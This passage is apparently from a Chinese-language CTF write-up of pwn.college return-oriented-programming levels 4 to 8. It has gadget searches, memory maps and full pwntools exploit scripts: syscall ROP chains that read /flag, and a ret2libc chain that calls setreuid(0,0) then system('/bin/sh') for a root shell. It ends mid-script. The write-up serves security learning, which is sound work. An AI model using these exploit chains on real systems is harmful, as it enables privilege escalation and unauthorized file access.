class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x00000000004026a7 : pop rdx ; ret<br>hacker@return-oriented-programming~level4-0:/challenge$ ROPgadget --binary ./babyrop_level4.0 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;r10&quot;</span><br>0x00000000004026a6 : pop r10 ; ret<br></code></pre></td></tr></table></figure><p>啥都有，IDA打开算一下padding：<code>0x60 + 8</code>&#x3D;0x68。被以前的自己所恶心了一下。以前写shellcode level1的时候图方便用的sendfile作为第二个系统调用。但是这里是不支持sendfile的，找不到这个系统调用号。因此还是得用<code>open</code>+<code>read</code>+<code>write</code>三兄弟。然后有两点值得注意：1. 经过之前的题目，很容易猜测open后的flag的fd大概率为3。2. flag的长度为0x39</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;/challenge/babyrop_level4.0&quot;</span>)<br><span class="hljs-attribute">padding</span> = b&#x27;/flag&#x27;+ p8(<span class="hljs-number">0</span>x00) + b&#x27;a&#x27;*<span class="hljs-number">0</span>x62<br><span class="hljs-attribute">p</span>.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)<br><span class="hljs-attribute">buf_addr</span> = p.recv(<span class="hljs-number">14</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;buf_addr:&quot;</span>, buf_addr)<br><span class="hljs-attribute">buf_addr</span> = p64(int(buf_addr.decode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)[<span class="hljs-number">2</span>:], <span class="hljs-number">16</span>))<br><span class="hljs-attribute">pop_rdi</span> = p64(<span class="hljs-number">0</span>x4026c6)<br><span class="hljs-attribute">pop_rsi</span> = p64(<span class="hljs-number">0</span>x4026ae)<br><span class="hljs-attribute">pop_rax</span> = p64(<span class="hljs-number">0</span>x402697)<br><span class="hljs-attribute">syscall</span> = p64(<span class="hljs-number">0</span>x4026b6)<br><span class="hljs-attribute">pop_rdx</span> = p64(<span class="hljs-number">0</span>x4026a7)<br><span class="hljs-attribute">pop_r10</span> = p64(<span class="hljs-number">0</span>x4026a6)<br><span class="hljs-attribute">open_sys</span> = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0</span>x0) + pop_rax + p64(<span class="hljs-number">0</span>x2) + syscall<br><span class="hljs-attribute">read_sys</span> = pop_rax + p64(<span class="hljs-number">0</span>x0) + pop_rdi + p64(<span class="hljs-number">0</span>x3) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br><span class="hljs-attribute">write_sys</span> = pop_rdx + p64(<span class="hljs-number">0</span>x39) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br><span class="hljs-attribute">payload</span> = padding + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br><span class="hljs-attribute">p</span>.send(payload)<br><br><span class="hljs-attribute">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><h4 id="level4-1-2"><a href="#level4-1-2" class="headerlink" title="level4.1"></a>level4.1</h4><p>两件事：1. 换gadgets的地址。2. 算padding</p><p>即可拿到flag</p><h4 id="level5-0-2"><a href="#level5-0-2" class="headerlink" title="level5.0"></a>level5.0</h4><p>这题没有leak了，所以不知道栈的地址。但是上一题的exp中，栈地址是为了存储”&#x2F;flag”字符串以及存储读出来的flag。那么可以写入其他可读可写的空间。用IDA pro打开，可以看到哪些字段是可写的段。选这些段的地址即可存储flag。然后为了把”&#x2F;flag”字符串写入到程序中，因此需要额外调用一个read来接收stdin，stdin就是”&#x2F;flag”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level5.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405090</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004026df</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004026ff</span>)<br>pop_rax = p64(<span class="hljs-number">0x00000000004026e8</span>)<br>syscall = p64(<span class="hljs-number">0x000000000040270f</span>)<br>pop_rdx = p64(<span class="hljs-number">0x00000000004026f0</span>)<br>open_sys = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rax + p64(<span class="hljs-number">0x2</span>) + syscall<br>read_sys = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0x3</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">1024</span>) + syscall<br>write_sys = pop_rdx + p64(<span class="hljs-number">0x39</span>) + pop_rax + p64(<span class="hljs-number">1</span>) + pop_rdi + p64(<span class="hljs-number">1</span>) + pop_rsi + buf_addr + syscall<br>read_stdin = pop_rax + p64(<span class="hljs-number">0x0</span>) + pop_rdi + p64(<span class="hljs-number">0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + syscall<br>payload = padding + read_stdin + open_sys + read_sys + write_sys<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><h4 id="level5-1-2"><a href="#level5-1-2" class="headerlink" title="level5.1"></a>level5.1</h4><p>查看可读可写段：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; vmmap<br><span class="hljs-attribute">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             <span class="hljs-attribute">Start</span>                End Perm     Size Offset File<br>          <span class="hljs-attribute">0x400000</span>           <span class="hljs-number">0</span>x401000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x401000</span>           <span class="hljs-number">0</span>x402000 r-xp     <span class="hljs-number">1000</span>   <span class="hljs-number">1000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x402000</span>           <span class="hljs-number">0</span>x403000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x403000</span>           <span class="hljs-number">0</span>x404000 r--p     <span class="hljs-number">1000</span>   <span class="hljs-number">2000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>          <span class="hljs-attribute">0x404000</span>           <span class="hljs-number">0</span>x405000 rw-p     <span class="hljs-number">1000</span>   <span class="hljs-number">3000</span> /challenge/babyrop_level5.<span class="hljs-number">1</span><br>         <span class="hljs-attribute">0x17fc000</span>          <span class="hljs-number">0</span>x181d000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [heap]</span><br>    <span class="hljs-attribute">0x7897c231d000</span>     <span class="hljs-number">0</span>x7897c233f000 r--p    <span class="hljs-number">22000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c233f000</span>     <span class="hljs-number">0</span>x7897c24b7000 r-xp   <span class="hljs-number">178000</span>  <span class="hljs-number">22000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c24b7000</span>     <span class="hljs-number">0</span>x7897c2505000 r--p    <span class="hljs-number">4</span>e000 <span class="hljs-number">19</span>a000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2505000</span>     <span class="hljs-number">0</span>x7897c2509000 r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>e7000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2509000</span>     <span class="hljs-number">0</span>x7897c250b000 rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>eb000 /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c250b000</span>     <span class="hljs-number">0</span>x7897c2511000 rw-p     <span class="hljs-number">6000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c250b]</span><br>    <span class="hljs-attribute">0x7897c2520000</span>     <span class="hljs-number">0</span>x7897c2521000 r--p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2521000</span>     <span class="hljs-number">0</span>x7897c2544000 r-xp    <span class="hljs-number">23000</span>   <span class="hljs-number">1000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c2544000</span>     <span class="hljs-number">0</span>x7897c254c000 r--p     <span class="hljs-number">8000</span>  <span class="hljs-number">24000</span> /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254d000</span>     <span class="hljs-number">0</span>x7897c254e000 r--p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>c000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254e000</span>     <span class="hljs-number">0</span>x7897c254f000 rw-p     <span class="hljs-number">1000</span>  <span class="hljs-number">2</span>d000 /usr/lib/x86_64-linux-gnu/ld-<span class="hljs-number">2</span>.<span class="hljs-number">31</span>.so<br>    <span class="hljs-attribute">0x7897c254f000</span>     <span class="hljs-number">0</span>x7897c2550000 rw-p     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [anon_7897c254f]</span><br>    <span class="hljs-attribute">0x7fff1a68e000</span>     <span class="hljs-number">0</span>x7fff1a6af000 rw-p    <span class="hljs-number">21000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [stack]</span><br>    <span class="hljs-attribute">0x7fff1a7e9000</span>     <span class="hljs-number">0</span>x7fff1a7ed000 r--p     <span class="hljs-number">4000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vvar]</span><br>    <span class="hljs-attribute">0x7fff1a7ed000</span>     <span class="hljs-number">0</span>x7fff1a7ef000 r-xp     <span class="hljs-number">2000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vdso]</span><br><span class="hljs-attribute">0xffffffffff600000</span> <span class="hljs-number">0</span>xffffffffff601000 --xp     <span class="hljs-number">1000</span>      <span class="hljs-number">0</span><span class="hljs-meta"> [vsyscall]</span><br></code></pre></td></tr></table></figure><p>查看gadget：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rax&quot;</span><br>0x0000000000401bc7 : pop rax ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdx&quot;</span><br>0x0000000000401bef : pop rdx ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rdi&quot;</span><br>0x0000000000401bd7 : pop rdi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;rsi&quot;</span><br>0x0000000000401d61 : pop rsi ; pop r15 ; ret<br>0x0000000000401bcf : pop rsi ; ret<br>hacker@return-oriented-programming~level5-1:/challenge$ ROPgadget --binary <span class="hljs-string">&quot;./babyrop_level5.1&quot;</span> --only <span class="hljs-string">&quot;syscall&quot;</span><br>Gadgets information<br>============================================================<br>0x0000000000401bdf : syscall<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure><h4 id="level6-0-1"><a href="#level6-0-1" class="headerlink" title="level6.0"></a>level6.0</h4><p>没有syscall gadget了。但是在IDA中看到了以下函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">force_import</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">off_t</span> *v2; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rcx</span><br><br>  open(a1, a2);<br>  <span class="hljs-keyword">return</span> sendfile((<span class="hljs-type">int</span>)a1, a2, v2, v3);<br>&#125;<br></code></pre></td></tr></table></figure><p>sendfile这个可太熟了，第一个shellcode就是sendfile。直接调用这个函数就行了。查看gadget：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000004014d2</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rbx</span> <span class="hljs-comment">; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-number">0x00000000004023d4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rcx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023cc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdi</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000004023dc</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rdx</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x0000000000402621</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; pop r15 ; ret</span><br><span class="hljs-number">0x00000000004023c4</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">rsi</span> <span class="hljs-comment">; ret</span><br></code></pre></td></tr></table></figure><p>force_import的地址：<code>0x402399</code>。这里复习一下<code>x86-64</code>架构的<code>System V AMD64 ABI</code>调用约定下，<strong>整数和指针</strong>参数传递规则</p><table><thead><tr><th>参数顺序</th><th>寄存器</th></tr></thead><tbody><tr><td>第1个</td><td><code>rdi</code></td></tr><tr><td>第2个</td><td><code>rsi</code></td></tr><tr><td>第3个</td><td><code>rdx</code></td></tr><tr><td>第4个</td><td><code>rcx</code></td></tr><tr><td>第5个</td><td><code>r8</code></td></tr><tr><td>第6个</td><td><code>r9</code></td></tr><tr><td>第7个及以后</td><td>栈</td></tr></tbody></table><p>当掌握了返回地址时，可以跳跃到任何地方。包括一个函数的中间某条指令处。只要某个段有可执行权限，那么就可以将返回地址设置为它，并执行其中的代码。这里用到了<code>.plt.sec</code>段的read函数。然后使其接收用户输入来将”&#x2F;flag”字符串写入一个可写段。再调用force_import。</p><p>这里需要调用两次force_import，且第一次应该是函数的起始地址，因为我们需要正常返回，需要主要函数调用时栈的迁移。如果我们设置的ret地址是调用open时的地址，那么在执行完sendfile后，无法正常返回。因为返回地址没有push进栈，导致返回不了。第二次时，可以不执行open，执行open的话会导致我们设置的ROP失效，因为open函数调用后会导致一些寄存器的值被修改，导致sendfile失败。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level6.0&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span><br><span class="hljs-comment"># p.recvuntil(b&#x27;[LEAK] Your input buffer is located at: &#x27;)</span><br><span class="hljs-comment"># buf_addr = p.recv(14)</span><br><span class="hljs-comment"># print(&quot;buf_addr:&quot;, buf_addr)</span><br><span class="hljs-comment"># buf_addr = p64(int(buf_addr.decode(&#x27;utf-8&#x27;)[2:], 16))</span><br>buf_addr = p64(<span class="hljs-number">0x405000</span>)<br>pop_rdi = p64(<span class="hljs-number">0x00000000004023cc</span>)<br>pop_rsi = p64(<span class="hljs-number">0x00000000004023c4</span>)<br>pop_rax = p64(<span class="hljs-number">0x0000000000401bc7</span>)<br>pop_rcx = p64(<span class="hljs-number">0x00000000004023d4</span>)<br><span class="hljs-comment"># syscall = p64(0x0000000000401bdf)</span><br>pop_rdx = p64(<span class="hljs-number">0x00000000004023dc</span>)<br><span class="hljs-comment"># open_sys = pop_rdi + buf_addr + pop_rsi + p64(0x0) + pop_rax + p64(0x2) + syscall</span><br><span class="hljs-comment"># read_sys = pop_rax + p64(0x0) + pop_rdi + p64(0x3) + pop_rsi + buf_addr + pop_rdx + p64(1024) + syscall</span><br><span class="hljs-comment"># write_sys = pop_rdx + p64(0x39) + pop_rax + p64(1) + pop_rdi + p64(1) + pop_rsi + buf_addr + syscall</span><br><span class="hljs-comment"># read_stdin = pop_rax + p64(0x0) + pop_rdi + p64(0) + pop_rsi + buf_addr + pop_rdx + p64(0x6) + syscall</span><br>read_stdin = pop_rdi + p64(<span class="hljs-number">0x0</span>) + pop_rsi + buf_addr + pop_rdx + p64(<span class="hljs-number">0x6</span>) + p64(<span class="hljs-number">0x401160</span>)<br>force_import_open = pop_rdi + buf_addr + pop_rsi + p64(<span class="hljs-number">0x0</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x402399</span>)<br>force_import_send = pop_rdi + p64(<span class="hljs-number">0x1</span>) + pop_rsi + p64(<span class="hljs-number">0x3</span>) + pop_rdx + p64(<span class="hljs-number">0x0</span>) + pop_rcx + p64(<span class="hljs-number">0x39</span>) + p64(<span class="hljs-number">0x4023ab</span>)<br>payload = padding + read_stdin + force_import_open + force_import_send<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + p8(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-built_in">print</span>(p.recvall())<br></code></pre></td></tr></table></figure><h4 id="level6-1-1"><a href="#level6-1-1" class="headerlink" title="level6.1"></a>level6.1</h4><p>这道题就是上面的exp改地址就行了。</p><h4 id="level7-0-1"><a href="#level7-0-1" class="headerlink" title="level7.0"></a>level7.0</h4><p>这里有一个坑啊，就是直接使用<code>system(&quot;/bin/sh&quot;)</code>，拿到shell后，还是”hacker”的身份，依然没有权限拿到flag。需要做一个进程uid的修改。</p><blockquote><p>UID（用户标识符）</p><p>UID是用于标识系统中每个用户的唯一数字。每个用户都有一个UID，系统通过UID来识别用户并控制其权限。普通用户的UID从1000开始，具体取决于系统的配置。ROOT用户的UID始终为0。</p><p>Real UID和 Effective UID</p><p>真实用户ID是启动进程的用户的UID。它代表了进程的真正所有者。</p><p>有效用户ID决定了进程在执行操作时的权限级别。有些时候进程需要特权时便会切换EUID以执行相应操作。</p><p>但是，RUID为普通用户，启动的shell也是普通用户。【也有例外】如果可执行文件设置了Set UID位，并且其所有者是Root，那么无论谁允许该程序，进程的有效用户ID都会是Root。</p><p><code>setreuid</code>是一个系统调用，用户改变进程的真实用户ID和有效用户ID。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">setreuid</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> ruid, <span class="hljs-type">uid_t</span> euid)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">ruid: 要设置的真实用户ID。如果传入-1，则表示不改变当前的ruid。0表示root</span><br><span class="hljs-comment">euid: 要设置的有效用户ID。如果传入-1，则表示不改变当前的euid。0表示root</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></blockquote><p>这一个level我尝试了chmod，但是发现不行。chmod+ln -s的方式。修改&#x2F;flag的软链接文件的权限，但是是失败的，我在Practice模式里尝试也是失败的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level7.0&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span><br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of \&quot;system\&quot; in libc is: &quot;</span>)<br>sys_addr = p.recv(<span class="hljs-number">14</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(sys_addr.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sys_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(sys_addr))<br>libc.address = sys_addr - libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump)<br><br>payload = padding + rop.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level7-1-1"><a href="#level7-1-1" class="headerlink" title="level7.1"></a>level7.1</h4><p>只改padding即可。</p><h4 id="level8-0-1"><a href="#level8-0-1" class="headerlink" title="level8.0"></a>level8.0</h4><p>看了一下课才知道怎么做。思路是：由于延迟绑定的原因，只有先执行一遍libc中的函数，libc.so才会被加载进内存，此时我们获得的libc的基址就是内存中实际libc的地址。因此，可以采用<code>puts(puts)</code>的形式，像题目中提示的那样。</p><p>首先执行一次<code>plt.put(got.puts)</code>，这样能够把got表中puts的值打印出来。然后再用puts的got表地址减去puts在libc中的偏移地址得到libc的基地址。此时，我们再返回challenge函数重新执行一遍challenge。第二次challenge的执行是为了获得shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level8.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span><br>challenge_addr = p64(<span class="hljs-number">0x402000</span>)  <span class="hljs-comment"># 